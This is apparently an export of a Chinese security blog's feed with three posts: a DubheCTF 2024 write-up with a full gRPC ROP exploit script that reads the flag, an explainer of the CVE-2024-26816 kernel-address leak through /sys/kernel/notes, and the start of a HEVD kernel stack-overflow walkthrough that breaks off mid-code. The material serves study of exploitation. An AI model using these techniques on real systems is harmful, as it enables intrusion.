&#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterRequest &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message ErrorResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后通信发现回显不对，一直卡住了。问题在于如何一个Request显示4种message?</p>
<hr>
<p>赛后看WP，只能说做题时重点错了，应该直接找相关工具的</p>
<p>可以用pbtk还原protobuf结构：<a href="https://wzt.ac.cn/2023/12/14/protobuf/">逆向恢复 Protobuf 对象结构</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python pbtk/extractors/from_binary.py  ./pwn ./ggbond.proto </span><br></pre></td></tr></table></figure>

<p>获得proto文件，可以看出使用 oneof 处理请求，并且编号不对😫</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;./;ggbond&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">GGBondServer</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> Handler(Request) <span class="keyword">returns</span> (Response)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Request</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> request &#123;</span><br><span class="line">        WhoamiRequest whoami = <span class="number">100</span>;</span><br><span class="line">        RoleChangeRequest role_change = <span class="number">101</span>;</span><br><span class="line">        RepeaterRequest repeater = <span class="number">102</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> response &#123;</span><br><span class="line">        WhoamiResponse whoami = <span class="number">200</span>;</span><br><span class="line">        RoleChangeResponse role_change = <span class="number">201</span>;</span><br><span class="line">        RepeaterResponse repeater = <span class="number">202</span>;</span><br><span class="line">        ErrorResponse error = <span class="number">444</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiRequest</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeRequest</span> &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterRequest</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">4444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>根据字符串应该是在<code>.noptrdata:0000000000C22E62</code> 这一段区域，结合protobuf结构反序列化一下</p>
</blockquote>
<p>因此就可以进行<del>愉快的</del>尝试PWN了</p>
<p>首先测试三个功能</p>
<ul>
<li>Whoami: 用户</li>
<li>RoleChange: 改变用户,用户change不能超过3,否则切换失败</li>
<li>Repeater: 用户后添加我们发送的内容</li>
</ul>
<p>因此也是很简单的功能,先尝试手测,然后就崩溃了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:1337&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">1</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure>

<p>第三次请求时保存,连接断开,因此从第三次尝试</p>
<p>在 <code>repeater_request(cyclic(0x28))</code> 不崩溃,在0x30崩溃</p>
<p>逆向一下repeater,结合测试的结果,还是能大致猜出来</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( tab == off_9799C0 )   <span class="comment">// request.tab = RepeaterRequest</span></span><br><span class="line">  &#123;</span><br><span class="line">    v99 = a3;</span><br><span class="line">    <span class="keyword">if</span> ( qword_C94B80 == <span class="number">3</span> )   <span class="comment">// role=3 特殊处理</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将传入的数据 base64 解码</span></span><br><span class="line">v100 = *(<span class="type">string</span> *)(*(_QWORD *)v99-&gt;Request.data + <span class="number">40</span>LL);</span><br><span class="line"><span class="built_in">len</span> = v100.<span class="built_in">len</span>;</span><br><span class="line">v102 = encoding_base64__ptr_Encoding_DecodeString(qword_C62CA0, v100);</span><br><span class="line">ptr = v102<span class="number">.0</span>.ptr;</span><br><span class="line">v92 = v102<span class="number">.0</span>.<span class="built_in">len</span>;</span><br><span class="line"><span class="built_in">cap</span> = v102<span class="number">.0</span>.<span class="built_in">cap</span>;</span><br><span class="line">v76[<span class="number">0</span>] = v8;  <span class="comment">// 这是一个栈上的数据</span></span><br><span class="line">v76[<span class="number">1</span>] = v8;  </span><br><span class="line">v94 = v76;</span><br><span class="line">v95 = <span class="number">32</span>LL;</span><br><span class="line">v96 = <span class="number">32</span>LL;</span><br><span class="line">v50 = v76;</span><br><span class="line">v51 = v102<span class="number">.0</span>.ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// go Unsafe 做指针加法</span></span><br><span class="line"><span class="comment">// 将解码后的数据传递给v50</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>LL; i &lt; (__int64)(<span class="number">3</span> * (<span class="built_in">len</span> &gt;&gt; <span class="number">2</span>)); ++i )</span><br><span class="line">&#123;</span><br><span class="line">	*(_BYTE *)v50 = *v51;</span><br><span class="line">	v50 = (__int128 *)((char *)v50 + <span class="number">1</span>);</span><br><span class="line">	++v51;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就是下断点,调试,获得si到bp的距离</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RDI  0xc00002832c ◂— 0x333231 /* <span class="string">&#x27;123&#x27;</span> */</span><br><span class="line"> RSI  0xc0001bb628 ◂— 0x0</span><br><span class="line"> RSP  0xc0001bb5e0 —▸ 0xc0001aa000 ◂— 0x4847464544434241 (<span class="string">&#x27;ABCDEFGH&#x27;</span>)</span><br><span class="line">*RIP  0x7ee024 ◂— movzx r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line"> ► 0x7ee024    movzx  r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee028    mov    byte ptr [rsi], r10b</span><br><span class="line">   0x7ee02b    inc    rax</span><br><span class="line">   0x7ee02e    lea    rsi, [r8 + 1]</span><br><span class="line">   0x7ee032    lea    rdi, [r9 + 1]</span><br><span class="line">   0x7ee036    cmp    rax, rdx</span><br><span class="line">   0x7ee039    jl     0x7ee01e                      &lt;0x7ee01e&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line">pwndbg&gt; p/x 0xc0001bb6e8-0xc0001bb628</span><br><span class="line"><span class="variable">$2</span> = 0xc0</span><br></pre></td></tr></table></figure>

<p>然后就是写ROP了: ORW将flag打出来,使用syscall.</p>
<p>查看别人的WP,打远程</p>
<ul>
<li>先 nc 目标端口，用来接收orw的结果</li>
<li>再建立一个rpc连接，用来打</li>
</ul>
<p>打本地:这个文件fd得调试出来.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:23334&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># role_change_request(1)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># role_change_request(2)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x000000000040452c</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401537</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000422398</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004101e6</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000461bd1</span></span><br><span class="line">flag = <span class="number">0x00000000007ef68d</span></span><br><span class="line">bss_buf = <span class="number">0xC6CF60</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xc0</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># open(&quot;flag&quot;, 0) -&gt; syscall(2, &#x27;flag&#x27;, 0)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, flag,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">10</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit 1</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">60</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">repeater_request(base64.b64encode(payload))</span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.wm-team.cn/index.php/archives/72/">DubheCTF 2024 By W&amp;M</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ELFNote-leak-kernel-base</title>
    <url>/2024/04/15/ELFNote-leak-kernel-base/</url>
    <content><![CDATA[<blockquote>
<p>CVE-2024-26816</p>
</blockquote>
<span id="more"></span>

<p>读取 <code>/sys/kernel/notes</code> 内容来进行泄露 <code>startup_xen</code> 的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo grep startup_xen /proc/kallsyms</span><br><span class="line">ffffffff9fa94430 T startup_xen</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -al /sys/kernel/notes     </span><br><span class="line">-r--r--r-- 1 root root 472 Apr 15 12:15 /sys/kernel/notes</span><br><span class="line"></span><br><span class="line">$ hexdump -C /sys/kernel/notes                                </span><br><span class="line">00000000  04 00 00 00 14 00 00 00  03 00 00 00 47 4e 55 00  |............GNU.|</span><br><span class="line">00000010  14 ef 14 05 a3 aa ad c2  53 c3 cc 95 80 be 45 a7  |........S.....E.|</span><br><span class="line">00000020  96 1f b5 51 06 00 00 00  04 00 00 00 01 01 00 00  |...Q............|</span><br><span class="line">00000030  4c 69 6e 75 78 00 00 00  00 00 00 00 06 00 00 00  |Linux...........|</span><br><span class="line">00000040  01 00 00 00 00 01 00 00  4c 69 6e 75 78 00 00 00  |........Linux...|</span><br><span class="line">00000050  00 00 00 00 04 00 00 00  08 00 00 00 12 00 00 00  |................|</span><br><span class="line">00000060  58 65 6e 00 00 00 40 1d  00 00 00 00 04 00 00 00  |Xen...@.........|</span><br><span class="line">00000070  06 00 00 00 06 00 00 00  58 65 6e 00 6c 69 6e 75  |........Xen.linu|</span><br><span class="line">00000080  78 00 00 00 04 00 00 00  04 00 00 00 07 00 00 00  |x...............|</span><br><span class="line">00000090  58 65 6e 00 32 2e 36 00  04 00 00 00 08 00 00 00  |Xen.2.6.........|</span><br><span class="line">000000a0  05 00 00 00 58 65 6e 00  78 65 6e 2d 33 2e 30 00  |....Xen.xen-3.0.|</span><br><span class="line">000000b0  04 00 00 00 08 00 00 00  03 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">000000c0  00 00 00 80 ff ff ff ff  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">000000d0  0f 00 00 00 58 65 6e 00  00 00 00 00 80 00 00 00  |....Xen.........|</span><br><span class="line">000000e0  04 00 00 00 08 00 00 00  01 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">000000f0  30 44 a9 9f ff ff ff ff  04 00 00 00 15 00 00 00  |0D..............|</span><br><span class="line">00000100  0a 00 00 00 58 65 6e 00  21 77 72 69 74 61 62 6c  |....Xen.!writabl|</span><br><span class="line">00000110  65 5f 70 61 67 65 5f 74  61 62 6c 65 73 00 00 00  |e_page_tables...|</span><br><span class="line">00000120  04 00 00 00 04 00 00 00  09 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">00000130  79 65 73 00 04 00 00 00  10 00 00 00 0d 00 00 00  |<span class="built_in">yes</span>.............|</span><br><span class="line">00000140  58 65 6e 00 01 00 00 00  00 00 00 00 01 00 00 00  |Xen.............|</span><br><span class="line">00000150  00 00 00 00 04 00 00 00  04 00 00 00 10 00 00 00  |................|</span><br><span class="line">00000160  58 65 6e 00 01 00 00 00  04 00 00 00 08 00 00 00  |Xen.............|</span><br><span class="line">00000170  04 00 00 00 58 65 6e 00  00 00 00 00 00 00 00 00  |....Xen.........|</span><br><span class="line">00000180  04 00 00 00 08 00 00 00  02 00 00 00 58 65 6e 00  |............Xen.|</span><br><span class="line">00000190  00 00 54 9e ff ff ff ff  04 00 00 00 04 00 00 00  |..T.............|</span><br><span class="line">000001a0  11 00 00 00 58 65 6e 00  01 88 00 00 04 00 00 00  |....Xen.........|</span><br><span class="line">000001b0  08 00 00 00 08 00 00 00  58 65 6e 00 67 65 6e 65  |........Xen.gene|</span><br><span class="line">000001c0  72 69 63 00 04 00 00 00  04 00 00 00 0e 00 00 00  |ric.............|</span><br><span class="line">000001d0  58 65 6e 00 01 00 00 00                           |Xen.....|</span><br><span class="line">000001d8</span><br></pre></td></tr></table></figure>


<p><code>arch/x86/xen/xen-head.S</code> 定义</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> XEN_ELFNOTE_ENTRY          1</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_GUEST_OS,       .asciz <span class="string">&quot;linux&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_GUEST_VERSION,  .asciz <span class="string">&quot;2.6&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_XEN_VERSION,    .asciz <span class="string">&quot;xen-3.0&quot;</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line">	<span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_INIT_P2M,       .<span class="built_in">quad</span> (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">		.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line">	<span class="built_in">ELFNOTE</span>(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p>ELFNOTE:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a structure with the same shape as Elf&#123;32,64&#125;_Nhdr (which</span></span><br><span class="line"><span class="comment"> * turn out to be the same size and shape), followed by the name and</span></span><br><span class="line"><span class="comment"> * desc data with appropriate padding.  The &#x27;desctype&#x27; argument is the</span></span><br><span class="line"><span class="comment"> * assembler pseudo op defining the type of the data e.g. .asciz while</span></span><br><span class="line"><span class="comment"> * &#x27;descdata&#x27; is the data itself e.g.  &quot;hello, world&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * e.g. ELFNOTE(XYZCo, 42, .asciz, &quot;forty-two&quot;)</span></span><br><span class="line"><span class="comment"> *      ELFNOTE(XYZCo, 12, .long, 0xdeadbeef)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE_START(name, type, flags)	\</span></span><br><span class="line"><span class="meta">.pushsection .note.name, flags,@note	;	\</span></span><br><span class="line"><span class="meta">  .balign 4				;	\</span></span><br><span class="line"><span class="meta">  .long 2f - 1f		<span class="comment">/* namesz */</span>	;	\</span></span><br><span class="line"><span class="meta">  .long 4484f - 3f	<span class="comment">/* descsz */</span>	;	\</span></span><br><span class="line"><span class="meta">  .long type				;	\</span></span><br><span class="line"><span class="meta">1:.asciz #name				;	\</span></span><br><span class="line"><span class="meta">2:.balign 4				;	\</span></span><br><span class="line"><span class="meta">3:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE_END				\</span></span><br><span class="line"><span class="meta">4484:.balign 4				;	\</span></span><br><span class="line"><span class="meta">.popsection				;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELFNOTE(name, type, desc)		\</span></span><br><span class="line"><span class="meta">	ELFNOTE_START(name, type, <span class="string">&quot;a&quot;</span>)		\</span></span><br><span class="line"><span class="meta">		desc			;	\</span></span><br><span class="line"><span class="meta">	ELFNOTE_END</span></span><br></pre></td></tr></table></figure>

<p>存在 <code>CONFIG_XEN_PV=y</code> 这一选项，会写入 <code>startup_xen</code> 的内容。\</p>
<ul>
<li>type: <code>1</code></li>
<li>name: <code>Xen</code></li>
</ul>
<p>Notes (Nhdr)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">   Elf32_Word n_namesz;</span><br><span class="line">   Elf32_Word n_descsz;</span><br><span class="line">   Elf32_Word n_type;</span><br><span class="line">&#125; Elf32_Nhdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">   Elf64_Word n_namesz;</span><br><span class="line">   Elf64_Word n_descsz;</span><br><span class="line">   Elf64_Word n_type;</span><br><span class="line">&#125; Elf64_Nhdr;</span><br></pre></td></tr></table></figure>

<p>其结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Nhdr</span><br><span class="line">name</span><br><span class="line">desc</span><br></pre></td></tr></table></figure>


<p>已经被patch，等待进入主线</p>
<ul>
<li><a href="https://lore.kernel.org/linux-hardening/202402180028.6DB512C50@keescook/">Re: [RESEND RFC] kernel&#x2F;ksysfs.c: restrict &#x2F;sys&#x2F;kernel&#x2F;notes to root access - Kees Cook</a></li>
</ul>
<p>这个问题被引入时，KASLR还没有出现🤣</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/advisories/GHSA-mw3g-jr7f-3gg4">CVE-2024-26816 · GitHub Advisory Database</a></li>
<li><a href="https://lwn.net/Articles/962782/">When ELF notes reveal too much [LWN.net]</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD-StackOverFlow</title>
    <url>/2024/04/03/HEVD-StackOverFlow/</url>
    <content><![CDATA[<blockquote>
<p>栈溢出，梦开始的地方</p>
</blockquote>
<span id="more"></span>

<p>相关代码在仓库<a href="https://github.com/Ha0-Y/HEVDExploits">HEVDExploits</a></p>
<h2 id="Without-GS"><a href="#Without-GS" class="headerlink" title="Without GS"></a>Without GS</h2><p>存在问题的区域</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222003</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">BufferOverflowStackIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>Ioctl获得用户态参数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">BufferOverflowStackIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *Type3InputBuffer; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> InputBufferLength; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  Type3InputBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;</span><br><span class="line">  result = <span class="number">3221225473</span>i64;</span><br><span class="line">  InputBufferLength = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">  <span class="keyword">if</span> ( Type3InputBuffer )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">TriggerBufferOverflowStack</span>(Type3InputBuffer, InputBufferLength);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取到内核栈中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerBufferOverflowStack</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> KernelBuffer[<span class="number">512</span>]; <span class="comment">// [rsp+20h] [rbp-818h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(KernelBuffer));</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0x800</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  <span 